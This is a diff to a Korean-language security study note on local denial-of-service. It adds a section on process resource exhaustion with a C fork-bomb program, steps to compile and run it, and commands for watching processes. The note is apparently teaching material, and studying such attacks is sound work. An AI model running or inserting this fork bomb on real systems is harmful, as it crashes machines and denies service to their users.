@@ -58,11 +58,33 @@ main(){
 
 vi memory.c ➜ i ➜ 입력 ➜ esc ➜ shift + : ➜ wq ➜ gcc memory.c ➜ ./a.out
 
+
+
+#### 프로세스 자원 고갈 공격
+
+* 
+
+**ps -ef**명령어로 시스템 프로세스 확인하기
+
+```c
+//fork() 함수를 사용하여 무한대로 자식 프로세스를 생성하는 프로그램
+#include <unistd.h>
+main(){
+	while(1)
+		fork();
+	return (0);
+}
+```
+
+vi process.c ➜ i ➜ 입력 ➜ esc ➜shift + : ➜ wq ➜ gcc process.c ➜  gcc -o process process.c ➜ ./process
+
+
+
 <!--
 
 실행파일
 
-df -h
+./a.out -> df -h
 
 gcc -o disk disk.c / disk라는 이름으로 오브젝트 생성
 
@@ -93,6 +115,10 @@ directory/read/write/excute
 소유자|그룹사용자|일반사용자
 
 
+
+작업 관리자 -> 세부정보 (window)
+
+top(리눅스)
 
 ex)
 
